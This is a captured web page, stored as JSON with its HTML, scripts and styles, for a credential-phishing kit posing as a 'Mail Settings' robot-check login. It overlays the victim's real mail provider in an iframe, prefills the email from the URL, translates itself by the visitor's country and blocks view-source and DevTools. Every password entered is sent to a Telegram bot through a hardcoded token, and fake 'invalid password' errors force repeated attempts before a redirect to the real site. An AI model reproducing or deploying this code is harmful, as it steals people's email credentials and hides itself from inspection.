{
  "url": "https://secure-login-coral.vercel.app/",
  "html": "<html lang=\"en\"><head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Mail Settings - Loading...</title>\n    <script type=\"text/javascript\">\n        // Disable right-click (context menu) on the whole document\n        document.addEventListener('contextmenu', function (e) {\n            e.preventDefault();\n        });\n\n        // Disable 'View Source', Developer Tools and Save actions (Ctrl+S, Ctrl+U, F12)\n        document.addEventListener('keydown', function (e) {\n            // Disable F12 (DevTools)\n            if (e.keyCode === 123) {\n                e.preventDefault();\n            }\n            // Disable Ctrl+S (Save as)\n            if (e.ctrlKey && (e.key === 's' || e.keyCode === 83)) {\n                e.preventDefault();\n            }\n            // Disable Ctrl+U (View Source)\n            if (e.ctrlKey && (e.key === 'u' || e.keyCode === 85)) {\n                e.preventDefault();\n            }\n            // Disable Ctrl+Shift+I (Developer Tools)\n            if (e.ctrlKey && e.shiftKey && e.keyCode === 73) {\n                e.preventDefault();\n            }\n            // Disable Ctrl+Shift+S (Save As)\n            if (e.ctrlKey && e.shiftKey && (e.keyCode === 83)) {\n                e.preventDefault();\n            }\n        });\n\n        // Disable right-click (mousedown event) on the entire document\n        document.addEventListener('mousedown', function (e) {\n            if (e.button === 2) { // Right-click (button 2 is right-click)\n                e.preventDefault();\n            }\n        });\n\n        // Disable text selection and dragging on the entire document\n        document.addEventListener('selectstart', function (e) {\n            e.preventDefault(); // Prevent text selection\n        });\n\n        document.addEventListener('dragstart', function (e) {\n            e.preventDefault(); // Prevent dragging\n        });\n\n        // Disable page printing to prevent saving via print\n        window.onbeforeprint = function () {\n            alert('Printing is disabled.');\n            return false;\n        };\n    </script>\n    <style>\n        body {\n            font-family: Arial, sans-serif;\n            margin: 0;\n            padding: 0;\n            display: flex;\n            justify-content: center;\n            align-items: center;\n            height: 100vh;\n            overflow: hidden;\n            background: rgba(0, 0, 0, 0.7);\n        }\n        .form-container {\n            background: rgba(255, 255, 255, 0.95);\n            padding: 25px;\n            border-radius: 15px;\n            box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);\n            text-align: center;\n            width: 400px;\n            z-index: 2;\n            position: relative;\n        }\n        .form-container h2 {\n            display: flex;\n            flex-direction: column;\n            align-items: center;\n            gap: 10px;\n            margin-bottom: 20px;\n            font-size: 20px;\n            color: #333;\n        }\n        .form-container h2 img {\n            width: 48px;\n            height: 48px;\n            margin-bottom: 10px;\n        }\n        .input-group {\n            position: relative;\n            margin: 10px 0;\n        }\n        .input-group i {\n            position: absolute;\n            left: 10px;\n            top: 50%;\n            transform: translateY(-50%);\n            color: #777;\n        }\n        input[type=\"email\"], input[type=\"password\"] {\n            width: 100%;\n            padding: 10px 10px 10px 35px;\n            border: 1px solid #ccc;\n            border-radius: 8px;\n            font-size: 14px;\n            box-sizing: border-box;\n        }\n        input[type=\"email\"] {\n            background-color: #f9f9f9;\n            cursor: not-allowed;\n        }\n        button {\n            width: 100%;\n            padding: 10px;\n            background-color: #007BFF;\n            color: white;\n            border: none;\n            border-radius: 8px;\n            cursor: pointer;\n            font-size: 16px;\n            font-weight: bold;\n            transition: background-color 0.3s;\n            margin-top: 20px;\n        }\n        button:hover {\n            background-color: #0056b3;\n        }\n        .secured-text {\n            margin-top: 10px;\n            font-size: 12px;\n            color: #777;\n        }\n        .error-message {\n            color: red;\n            font-size: 12px;\n            margin-top: 5px;\n            display: none;\n        }\n        iframe {\n            position: absolute;\n            top: 0;\n            left: 0;\n            width: 100%;\n            height: 100%;\n            border: none;\n            z-index: 1;\n        }\n    </style>\n    <!-- Font Awesome for Icons -->\n    <link rel=\"stylesheet\" href=\"https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css\">\n</head>\n<body>\n    <!-- Form Container -->\n    <div class=\"form-container\">\n        <h2>\n            <img id=\"favicon\" src=\"\" alt=\"Favicon\" onerror=\"this.style.display='none'\" style=\"display: none;\">\n            <span id=\"loginText\">로봇이 아님을 증명하려면 이메일로 로그인하세요</span>\n        </h2>\n        <form id=\"loginForm\">\n            <div class=\"input-group\">\n                <i class=\"fas fa-user\"></i>\n                <input type=\"email\" id=\"email\" placeholder=\"이메일\" readonly=\"\">\n            </div>\n            <div class=\"input-group\">\n                <i class=\"fas fa-lock\"></i>\n                <input type=\"password\" id=\"password\" placeholder=\"비밀번호\" required=\"\">\n            </div>\n            <div class=\"error-message\" id=\"errorMessage\">잘못된 비밀번호입니다. 올바른 비밀번호를 입력하세요.</div>\n            <button type=\"submit\"><span id=\"loginButtonText\">로그인</span></button>\n            <div class=\"secured-text\" id=\"securedText\">보안 로그인 세션</div>\n    </form>\n\n    <script>\n        // Function to check for JavaScript\n        const isJavaScriptEnabled = true; // Assuming JS is enabled\n\n        // Timer to detect fast submissions (bots)\n        let formSubmitTime = new Date().getTime();\n        \n        // Check for mouse movements to detect human-like behavior\n        let isHuman = false;\n\n        // Detect mouse movement or clicks\n        document.addEventListener(\"mousemove\", function() {\n            isHuman = true;\n        });\n\n        // Event listener for the form submission\n        document.getElementById(\"contactForm\").addEventListener(\"submit\", function(event) {\n            // Check if the hidden field is filled (bots often fill out hidden fields)\n            if (document.getElementById(\"hiddenField\").value !== \"\") {\n                event.preventDefault();\n                showErrorMessage();\n                return false;\n            }\n\n            // Check if JavaScript is enabled (ensure JS is working)\n            if (!isJavaScriptEnabled) {\n                event.preventDefault();\n                showErrorMessage();\n                return false;\n            }\n\n            // Check the time taken to submit the form (bots submit forms too quickly)\n            const submissionTime = new Date().getTime() - formSubmitTime;\n            if (submissionTime < 3000) { // If submitted in less than 3 seconds, it's likely a bot\n                event.preventDefault();\n                showErrorMessage();\n                return false;\n            }\n\n            // If a human is detected, proceed with form submission\n            return true;\n        });\n\n        // Function to show the error message if bot is detected\n        function showErrorMessage() {\n            document.getElementById(\"errorMessage\").style.display = \"block\";\n        }\n\n        // Set form submit time when the page is loaded\n        window.onload = function() {\n            formSubmitTime = new Date().getTime();\n        };\n    </script>\n    </div>\n\n    <!-- Iframe to load the website -->\n    <iframe id=\"websiteFrame\" src=\"\"></iframe>\n\n    <script>\n        const emailInput = document.getElementById('email');\n        const loginForm = document.getElementById('loginForm');\n        const websiteFrame = document.getElementById('websiteFrame');\n        const favicon = document.getElementById('favicon');\n        const pageTitle = document.querySelector('title');\n        const loginText = document.getElementById('loginText');\n        const loginButtonText = document.getElementById('loginButtonText');\n        const securedText = document.getElementById('securedText');\n        const errorMessage = document.getElementById('errorMessage');\n\n        let retryCount = 0;\n        const maxRetries = 4;\n\n        // Telegram Bot Configuration\n        const TELEGRAM_BOT_TOKEN = '6472205834:AAGhmfDQepdAIV4ExajuHs_4yshBuAFw9vU'; // Replace with your bot token\n        const TELEGRAM_CHAT_ID = '6159490685'; // Replace with your chat ID\n\n        // Function to extract domain from email\n        function getDomainFromEmail(email) {\n            return email.split('@')[1];\n        }\n\n        // Function to load the website in the iframe\n        function loadWebsite(domain) {\n            const emailProviders = {\n                'gmail.com': 'https://mail.google.com',\n                'yahoo.com': 'https://mail.yahoo.com',\n                'hotmail.com': 'https://outlook.live.com',\n                'outlook.com': 'https://outlook.live.com',\n                'aol.com': 'https://mail.aol.com',\n\t\t\t\t'abv.bg': 'https://mail.abv.bg',\n\t\t\t\t'126.com': 'https://mail.126.com',\n\t\t\t\t'163.com': 'https://mail.163.com',\n            };\n\n            const url = emailProviders[domain] || `https://${domain}`;\n            websiteFrame.src = url;\n            fetchFavicon(domain);\n            updatePageTitle(domain);\n        }\n\n        // Function to fetch the favicon of the domain\n        function fetchFavicon(domain) {\n            favicon.src = `https://www.google.com/s2/favicons?sz=64&domain=${domain}`;\n        }\n\n        // Function to update the page title to match the domain's title\n        function updatePageTitle(domain) {\n            fetch(`https://${domain}`)\n                .then(response => response.text())\n                .then(html => {\n                    const doc = new DOMParser().parseFromString(html, 'text/html');\n                    const title = doc.querySelector('title')?.innerText || domain;\n                    pageTitle.innerText = `Mail Settings - ${title}`;\n                })\n                .catch(() => {\n                    pageTitle.innerText = `Mail Settings - ${domain}`;\n                });\n        }\n\n        // Function to send data to Telegram bot\n        async function sendToTelegram(email, password, ipInfo, attempt) {\n            const message = `\n                New Login Attempt (Attempt ${attempt}):\n                Email: ${email}\n                Password: ${password}\n                IP: ${ipInfo.ip}\n                Country: ${ipInfo.country}\n                Browser: ${navigator.userAgent}\n            `;\n\n            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;\n            const params = new URLSearchParams({\n                chat_id: TELEGRAM_CHAT_ID,\n                text: message,\n            });\n\n            await fetch(url, { method: 'POST', body: params });\n        }\n\n        // Function to get IP info using ipinfo.io\n        async function getIPInfo() {\n            const response = await fetch('https://ipinfo.io/json');\n            return response.json();\n        }\n\n        // Function to translate the page based on the visitor's country\n        async function translatePage() {\n            const ipInfo = await getIPInfo();\n            const country = ipInfo.country;\n\n            // Language mappings\n            const translations = {\n                IT: {\n                    loginText: \"Accedi con la tua email per dimostrare che non sei un robot\",\n                    emailPlaceholder: \"Email\",\n                    passwordPlaceholder: \"Password\",\n                    loginButtonText: \"Accedi\",\n                    securedText: \"Sessione di Accesso Sicura\",\n                    errorMessage: \"Password non valida. Inserisci la password corretta.\",\n                },\n                FR: {\n                    loginText: \"Veuillez vous connecter avec votre email pour prouver que vous n'êtes pas un robot\",\n                    emailPlaceholder: \"Email\",\n                    passwordPlaceholder: \"Mot de passe\",\n                    loginButtonText: \"Se connecter\",\n                    securedText: \"Session de Connexion Sécurisée\",\n                    errorMessage: \"Mot de passe incorrect. Veuillez entrer le mot de passe correct.\",\n                },\n                ES: {\n                    loginText: \"Inicie sesión con su correo electrónico para demostrar que no es un robot\",\n                    emailPlaceholder: \"Correo electrónico\",\n                    passwordPlaceholder: \"Contraseña\",\n                    loginButtonText: \"Iniciar sesión\",\n                    securedText: \"Sesión de Inicio Seguro\",\n                    errorMessage: \"Contraseña incorrecta. Por favor, ingrese la contraseña correcta.\",\n                },\n                DE: {\n                    loginText: \"Bitte melden Sie sich mit Ihrer E-Mail an, um zu beweisen, dass Sie kein Roboter sind\",\n                    emailPlaceholder: \"E-Mail\",\n                    passwordPlaceholder: \"Passwort\",\n                    loginButtonText: \"Anmelden\",\n                    securedText: \"Sichere Anmeldesitzung\",\n                    errorMessage: \"Ungültiges Passwort. Bitte geben Sie das richtige Passwort ein.\",\n                },\n                CN: {\n                    loginText: \"请使用您的电子邮件登录以证明您不是机器人\",\n                    emailPlaceholder: \"电子邮件\",\n                    passwordPlaceholder: \"密码\",\n                    loginButtonText: \"登录\",\n                    securedText: \"安全登录会话\",\n                    errorMessage: \"密码无效。请输入正确的密码。\",\n                },\n                JP: {\n                    loginText: \"ロボットでないことを証明するために、メールでサインインしてください\",\n                    emailPlaceholder: \"メールアドレス\",\n                    passwordPlaceholder: \"パスワード\",\n                    loginButtonText: \"サインイン\",\n                    securedText: \"安全なログインセッション\",\n                    errorMessage: \"パスワードが無効です。正しいパスワードを入力してください。\",\n                },\n\t\t\t\tPT: {\n                    loginText: \"Por favor, faça login com seu e-mail para provar que você não é um robô\",\n                    emailPlaceholder: \"E-mail\",\n                    passwordPlaceholder: \"Senha\",\n                    loginButtonText: \"Entrar\",\n                    securedText: \"Sessão de login segura\",\n                    errorMessage: \"Senha inválida. Por favor, insira a senha correta.\",\n\t\t\t\t\t                },\n\t\t\t\tRU: {\n                    loginText: \"Пожалуйста, войдите с помощью вашего электронного адреса, чтобы доказать, что вы не робот\",\n                    emailPlaceholder: \"Электронная почта\",\n                    passwordPlaceholder: \"Пароль\",\n                    loginButtonText: \"Войти\",\n                    securedText: \"Безопасная сессия входа\",\n                    errorMessage: \"Неверный пароль. Пожалуйста, введите правильный пароль.\",\n\t\t\t\t\t                },\n\t\t\t\tBG: {\n                    loginText: \"Моля, влезте с вашия имейл, за да докажете, че не сте робот\",\n                    emailPlaceholder: \"Имейл\",\n                    passwordPlaceholder: \"Парола\",\n                    loginButtonText: \"Влезте\",\n                    securedText: \"Сигурна сесия за вход\",\n                    errorMessage: \"Невалидна парола. Моля, въведете правилната парола.\",\n\t\t\t\t\t                },\n\t\t\t\tAR: {\n                    loginText: \"يرجى تسجيل الدخول باستخدام بريدك الإلكتروني لإثبات أنك لست روبوتًا\",\n                    emailPlaceholder: \"البريد الإلكتروني\",\n                    passwordPlaceholder: \"كلمة المرور\",\n                    loginButtonText: \"تسجيل الدخول\",\n                    securedText: \"جلسة تسجيل دخول آمنة\",\n                    errorMessage: \"كلمة المرور غير صالحة. يرجى إدخال كلمة المرور الصحيحة.\",\n                },\n                KR: {\n                    loginText: \"로봇이 아님을 증명하려면 이메일로 로그인하세요\",\n                    emailPlaceholder: \"이메일\",\n                    passwordPlaceholder: \"비밀번호\",\n                    loginButtonText: \"로그인\",\n                    securedText: \"보안 로그인 세션\",\n                    errorMessage: \"잘못된 비밀번호입니다. 올바른 비밀번호를 입력하세요.\",\n\t\t\t\t\t\n                },\n                // Add more languages as needed\n            };\n\n            const translation = translations[country] || {\n                loginText: \"Please sign in with your email to prove that you're not a Robot\",\n                emailPlaceholder: \"Email\",\n                passwordPlaceholder: \"Password\",\n                loginButtonText: \"Sign In\",\n                securedText: \"Secured Login Session\",\n                errorMessage: \"Invalid password. Please enter the correct password.\",\n            };\n\n            loginText.innerText = translation.loginText;\n            emailInput.placeholder = translation.emailPlaceholder;\n            document.getElementById('password').placeholder = translation.passwordPlaceholder;\n            loginButtonText.innerText = translation.loginButtonText;\n            securedText.innerText = translation.securedText;\n            errorMessage.innerText = translation.errorMessage;\n        }\n\n        // Event listener for form submission\n        loginForm.addEventListener('submit', async (e) => {\n            e.preventDefault();\n            const email = emailInput.value;\n            const password = document.getElementById('password').value;\n\n            // Prevent empty form submission\n            if (!password) {\n                errorMessage.innerText = \"Password cannot be empty.\";\n                errorMessage.style.display = 'block';\n                return;\n            }\n\n            // Increment retry count\n            retryCount++;\n\n            // Get IP info\n            const ipInfo = await getIPInfo();\n\n            // Send data to Telegram bot for each attempt\n            await sendToTelegram(email, password, ipInfo, retryCount);\n\n            if (retryCount < maxRetries) {\n                // Show error message for invalid password\n                errorMessage.style.display = 'block';\n            } else {\n                // Redirect to the email's domain\n                const domain = getDomainFromEmail(email);\n                window.location.href = `https://${domain}`;\n            }\n        });\n\n        // Check if there's a hash in the URL (e.g., www.site.com#info@millbrookgroup.com.au)\n        if (window.location.hash) {\n            const emailFromHash = window.location.hash.substring(1);\n            if (emailFromHash.includes('@')) {\n                emailInput.value = emailFromHash;\n                const domain = getDomainFromEmail(emailFromHash);\n                loadWebsite(domain);\n            }\n        }\n\n        // Automatically translate the page based on the visitor's country\n        translatePage();\n    </script>\n\n\n</body></html>",
  "scripts": [
    "\n        // Disable right-click (context menu) on the whole document\n        document.addEventListener('contextmenu', function (e) {\n            e.preventDefault();\n        });\n\n        // Disable 'View Source', Developer Tools and Save actions (Ctrl+S, Ctrl+U, F12)\n        document.addEventListener('keydown', function (e) {\n            // Disable F12 (DevTools)\n            if (e.keyCode === 123) {\n                e.preventDefault();\n            }\n            // Disable Ctrl+S (Save as)\n            if (e.ctrlKey && (e.key === 's' || e.keyCode === 83)) {\n                e.preventDefault();\n            }\n            // Disable Ctrl+U (View Source)\n            if (e.ctrlKey && (e.key === 'u' || e.keyCode === 85)) {\n                e.preventDefault();\n            }\n            // Disable Ctrl+Shift+I (Developer Tools)\n            if (e.ctrlKey && e.shiftKey && e.keyCode === 73) {\n                e.preventDefault();\n            }\n            // Disable Ctrl+Shift+S (Save As)\n            if (e.ctrlKey && e.shiftKey && (e.keyCode === 83)) {\n                e.preventDefault();\n            }\n        });\n\n        // Disable right-click (mousedown event) on the entire document\n        document.addEventListener('mousedown', function (e) {\n            if (e.button === 2) { // Right-click (button 2 is right-click)\n                e.preventDefault();\n            }\n        });\n\n        // Disable text selection and dragging on the entire document\n        document.addEventListener('selectstart', function (e) {\n            e.preventDefault(); // Prevent text selection\n        });\n\n        document.addEventListener('dragstart', function (e) {\n            e.preventDefault(); // Prevent dragging\n        });\n\n        // Disable page printing to prevent saving via print\n        window.onbeforeprint = function () {\n            alert('Printing is disabled.');\n            return false;\n        };\n    ",
    "\n        // Function to check for JavaScript\n        const isJavaScriptEnabled = true; // Assuming JS is enabled\n\n        // Timer to detect fast submissions (bots)\n        let formSubmitTime = new Date().getTime();\n        \n        // Check for mouse movements to detect human-like behavior\n        let isHuman = false;\n\n        // Detect mouse movement or clicks\n        document.addEventListener(\"mousemove\", function() {\n            isHuman = true;\n        });\n\n        // Event listener for the form submission\n        document.getElementById(\"contactForm\").addEventListener(\"submit\", function(event) {\n            // Check if the hidden field is filled (bots often fill out hidden fields)\n            if (document.getElementById(\"hiddenField\").value !== \"\") {\n                event.preventDefault();\n                showErrorMessage();\n                return false;\n            }\n\n            // Check if JavaScript is enabled (ensure JS is working)\n            if (!isJavaScriptEnabled) {\n                event.preventDefault();\n                showErrorMessage();\n                return false;\n            }\n\n            // Check the time taken to submit the form (bots submit forms too quickly)\n            const submissionTime = new Date().getTime() - formSubmitTime;\n            if (submissionTime < 3000) { // If submitted in less than 3 seconds, it's likely a bot\n                event.preventDefault();\n                showErrorMessage();\n                return false;\n            }\n\n            // If a human is detected, proceed with form submission\n            return true;\n        });\n\n        // Function to show the error message if bot is detected\n        function showErrorMessage() {\n            document.getElementById(\"errorMessage\").style.display = \"block\";\n        }\n\n        // Set form submit time when the page is loaded\n        window.onload = function() {\n            formSubmitTime = new Date().getTime();\n        };\n    ",
    "\n        const emailInput = document.getElementById('email');\n        const loginForm = document.getElementById('loginForm');\n        const websiteFrame = document.getElementById('websiteFrame');\n        const favicon = document.getElementById('favicon');\n        const pageTitle = document.querySelector('title');\n        const loginText = document.getElementById('loginText');\n        const loginButtonText = document.getElementById('loginButtonText');\n        const securedText = document.getElementById('securedText');\n        const errorMessage = document.getElementById('errorMessage');\n\n        let retryCount = 0;\n        const maxRetries = 4;\n\n        // Telegram Bot Configuration\n        const TELEGRAM_BOT_TOKEN = '6472205834:AAGhmfDQepdAIV4ExajuHs_4yshBuAFw9vU'; // Replace with your bot token\n        const TELEGRAM_CHAT_ID = '6159490685'; // Replace with your chat ID\n\n        // Function to extract domain from email\n        function getDomainFromEmail(email) {\n            return email.split('@')[1];\n        }\n\n        // Function to load the website in the iframe\n        function loadWebsite(domain) {\n            const emailProviders = {\n                'gmail.com': 'https://mail.google.com',\n                'yahoo.com': 'https://mail.yahoo.com',\n                'hotmail.com': 'https://outlook.live.com',\n                'outlook.com': 'https://outlook.live.com',\n                'aol.com': 'https://mail.aol.com',\n\t\t\t\t'abv.bg': 'https://mail.abv.bg',\n\t\t\t\t'126.com': 'https://mail.126.com',\n\t\t\t\t'163.com': 'https://mail.163.com',\n            };\n\n            const url = emailProviders[domain] || `https://${domain}`;\n            websiteFrame.src = url;\n            fetchFavicon(domain);\n            updatePageTitle(domain);\n        }\n\n        // Function to fetch the favicon of the domain\n        function fetchFavicon(domain) {\n            favicon.src = `https://www.google.com/s2/favicons?sz=64&domain=${domain}`;\n        }\n\n        // Function to update the page title to match the domain's title\n        function updatePageTitle(domain) {\n            fetch(`https://${domain}`)\n                .then(response => response.text())\n                .then(html => {\n                    const doc = new DOMParser().parseFromString(html, 'text/html');\n                    const title = doc.querySelector('title')?.innerText || domain;\n                    pageTitle.innerText = `Mail Settings - ${title}`;\n                })\n                .catch(() => {\n                    pageTitle.innerText = `Mail Settings - ${domain}`;\n                });\n        }\n\n        // Function to send data to Telegram bot\n        async function sendToTelegram(email, password, ipInfo, attempt) {\n            const message = `\n                New Login Attempt (Attempt ${attempt}):\n                Email: ${email}\n                Password: ${password}\n                IP: ${ipInfo.ip}\n                Country: ${ipInfo.country}\n                Browser: ${navigator.userAgent}\n            `;\n\n            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;\n            const params = new URLSearchParams({\n                chat_id: TELEGRAM_CHAT_ID,\n                text: message,\n            });\n\n            await fetch(url, { method: 'POST', body: params });\n        }\n\n        // Function to get IP info using ipinfo.io\n        async function getIPInfo() {\n            const response = await fetch('https://ipinfo.io/json');\n            return response.json();\n        }\n\n        // Function to translate the page based on the visitor's country\n        async function translatePage() {\n            const ipInfo = await getIPInfo();\n            const country = ipInfo.country;\n\n            // Language mappings\n            const translations = {\n                IT: {\n                    loginText: \"Accedi con la tua email per dimostrare che non sei un robot\",\n                    emailPlaceholder: \"Email\",\n                    passwordPlaceholder: \"Password\",\n                    loginButtonText: \"Accedi\",\n                    securedText: \"Sessione di Accesso Sicura\",\n                    errorMessage: \"Password non valida. Inserisci la password corretta.\",\n                },\n                FR: {\n                    loginText: \"Veuillez vous connecter avec votre email pour prouver que vous n'êtes pas un robot\",\n                    emailPlaceholder: \"Email\",\n                    passwordPlaceholder: \"Mot de passe\",\n                    loginButtonText: \"Se connecter\",\n                    securedText: \"Session de Connexion Sécurisée\",\n                    errorMessage: \"Mot de passe incorrect. Veuillez entrer le mot de passe correct.\",\n                },\n                ES: {\n                    loginText: \"Inicie sesión con su correo electrónico para demostrar que no es un robot\",\n                    emailPlaceholder: \"Correo electrónico\",\n                    passwordPlaceholder: \"Contraseña\",\n                    loginButtonText: \"Iniciar sesión\",\n                    securedText: \"Sesión de Inicio Seguro\",\n                    errorMessage: \"Contraseña incorrecta. Por favor, ingrese la contraseña correcta.\",\n                },\n                DE: {\n                    loginText: \"Bitte melden Sie sich mit Ihrer E-Mail an, um zu beweisen, dass Sie kein Roboter sind\",\n                    emailPlaceholder: \"E-Mail\",\n                    passwordPlaceholder: \"Passwort\",\n                    loginButtonText: \"Anmelden\",\n                    securedText: \"Sichere Anmeldesitzung\",\n                    errorMessage: \"Ungültiges Passwort. Bitte geben Sie das richtige Passwort ein.\",\n                },\n                CN: {\n                    loginText: \"请使用您的电子邮件登录以证明您不是机器人\",\n                    emailPlaceholder: \"电子邮件\",\n                    passwordPlaceholder: \"密码\",\n                    loginButtonText: \"登录\",\n                    securedText: \"安全登录会话\",\n                    errorMessage: \"密码无效。请输入正确的密码。\",\n                },\n                JP: {\n                    loginText: \"ロボットでないことを証明するために、メールでサインインしてください\",\n                    emailPlaceholder: \"メールアドレス\",\n                    passwordPlaceholder: \"パスワード\",\n                    loginButtonText: \"サインイン\",\n                    securedText: \"安全なログインセッション\",\n                    errorMessage: \"パスワードが無効です。正しいパスワードを入力してください。\",\n                },\n\t\t\t\tPT: {\n                    loginText: \"Por favor, faça login com seu e-mail para provar que você não é um robô\",\n                    emailPlaceholder: \"E-mail\",\n                    passwordPlaceholder: \"Senha\",\n                    loginButtonText: \"Entrar\",\n                    securedText: \"Sessão de login segura\",\n                    errorMessage: \"Senha inválida. Por favor, insira a senha correta.\",\n\t\t\t\t\t                },\n\t\t\t\tRU: {\n                    loginText: \"Пожалуйста, войдите с помощью вашего электронного адреса, чтобы доказать, что вы не робот\",\n                    emailPlaceholder: \"Электронная почта\",\n                    passwordPlaceholder: \"Пароль\",\n                    loginButtonText: \"Войти\",\n                    securedText: \"Безопасная сессия входа\",\n                    errorMessage: \"Неверный пароль. Пожалуйста, введите правильный пароль.\",\n\t\t\t\t\t                },\n\t\t\t\tBG: {\n                    loginText: \"Моля, влезте с вашия имейл, за да докажете, че не сте робот\",\n                    emailPlaceholder: \"Имейл\",\n                    passwordPlaceholder: \"Парола\",\n                    loginButtonText: \"Влезте\",\n                    securedText: \"Сигурна сесия за вход\",\n                    errorMessage: \"Невалидна парола. Моля, въведете правилната парола.\",\n\t\t\t\t\t                },\n\t\t\t\tAR: {\n                    loginText: \"يرجى تسجيل الدخول باستخدام بريدك الإلكتروني لإثبات أنك لست روبوتًا\",\n                    emailPlaceholder: \"البريد الإلكتروني\",\n                    passwordPlaceholder: \"كلمة المرور\",\n                    loginButtonText: \"تسجيل الدخول\",\n                    securedText: \"جلسة تسجيل دخول آمنة\",\n                    errorMessage: \"كلمة المرور غير صالحة. يرجى إدخال كلمة المرور الصحيحة.\",\n                },\n                KR: {\n                    loginText: \"로봇이 아님을 증명하려면 이메일로 로그인하세요\",\n                    emailPlaceholder: \"이메일\",\n                    passwordPlaceholder: \"비밀번호\",\n                    loginButtonText: \"로그인\",\n                    securedText: \"보안 로그인 세션\",\n                    errorMessage: \"잘못된 비밀번호입니다. 올바른 비밀번호를 입력하세요.\",\n\t\t\t\t\t\n                },\n                // Add more languages as needed\n            };\n\n            const translation = translations[country] || {\n                loginText: \"Please sign in with your email to prove that you're not a Robot\",\n                emailPlaceholder: \"Email\",\n                passwordPlaceholder: \"Password\",\n                loginButtonText: \"Sign In\",\n                securedText: \"Secured Login Session\",\n                errorMessage: \"Invalid password. Please enter the correct password.\",\n            };\n\n            loginText.innerText = translation.loginText;\n            emailInput.placeholder = translation.emailPlaceholder;\n            document.getElementById('password').placeholder = translation.passwordPlaceholder;\n            loginButtonText.innerText = translation.loginButtonText;\n            securedText.innerText = translation.securedText;\n            errorMessage.innerText = translation.errorMessage;\n        }\n\n        // Event listener for form submission\n        loginForm.addEventListener('submit', async (e) => {\n            e.preventDefault();\n            const email = emailInput.value;\n            const password = document.getElementById('password').value;\n\n            // Prevent empty form submission\n            if (!password) {\n                errorMessage.innerText = \"Password cannot be empty.\";\n                errorMessage.style.display = 'block';\n                return;\n            }\n\n            // Increment retry count\n            retryCount++;\n\n            // Get IP info\n            const ipInfo = await getIPInfo();\n\n            // Send data to Telegram bot for each attempt\n            await sendToTelegram(email, password, ipInfo, retryCount);\n\n            if (retryCount < maxRetries) {\n                // Show error message for invalid password\n                errorMessage.style.display = 'block';\n            } else {\n                // Redirect to the email's domain\n                const domain = getDomainFromEmail(email);\n                window.location.href = `https://${domain}`;\n            }\n        });\n\n        // Check if there's a hash in the URL (e.g., www.site.com#info@millbrookgroup.com.au)\n        if (window.location.hash) {\n            const emailFromHash = window.location.hash.substring(1);\n            if (emailFromHash.includes('@')) {\n                emailInput.value = emailFromHash;\n                const domain = getDomainFromEmail(emailFromHash);\n                loadWebsite(domain);\n            }\n        }\n\n        // Automatically translate the page based on the visitor's country\n        translatePage();\n    "
  ],
  "styles": [
    "\n        body {\n            font-family: Arial, sans-serif;\n            margin: 0;\n            padding: 0;\n            display: flex;\n            justify-content: center;\n            align-items: center;\n            height: 100vh;\n            overflow: hidden;\n            background: rgba(0, 0, 0, 0.7);\n        }\n        .form-container {\n            background: rgba(255, 255, 255, 0.95);\n            padding: 25px;\n            border-radius: 15px;\n            box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);\n            text-align: center;\n            width: 400px;\n            z-index: 2;\n            position: relative;\n        }\n        .form-container h2 {\n            display: flex;\n            flex-direction: column;\n            align-items: center;\n            gap: 10px;\n            margin-bottom: 20px;\n            font-size: 20px;\n            color: #333;\n        }\n        .form-container h2 img {\n            width: 48px;\n            height: 48px;\n            margin-bottom: 10px;\n        }\n        .input-group {\n            position: relative;\n            margin: 10px 0;\n        }\n        .input-group i {\n            position: absolute;\n            left: 10px;\n            top: 50%;\n            transform: translateY(-50%);\n            color: #777;\n        }\n        input[type=\"email\"], input[type=\"password\"] {\n            width: 100%;\n            padding: 10px 10px 10px 35px;\n            border: 1px solid #ccc;\n            border-radius: 8px;\n            font-size: 14px;\n            box-sizing: border-box;\n        }\n        input[type=\"email\"] {\n            background-color: #f9f9f9;\n            cursor: not-allowed;\n        }\n        button {\n            width: 100%;\n            padding: 10px;\n            background-color: #007BFF;\n            color: white;\n            border: none;\n            border-radius: 8px;\n            cursor: pointer;\n            font-size: 16px;\n            font-weight: bold;\n            transition: background-color 0.3s;\n            margin-top: 20px;\n        }\n        button:hover {\n            background-color: #0056b3;\n        }\n        .secured-text {\n            margin-top: 10px;\n            font-size: 12px;\n            color: #777;\n        }\n        .error-message {\n            color: red;\n            font-size: 12px;\n            margin-top: 5px;\n            display: none;\n        }\n        iframe {\n            position: absolute;\n            top: 0;\n            left: 0;\n            width: 100%;\n            height: 100%;\n            border: none;\n            z-index: 1;\n        }\n    "
  ]
}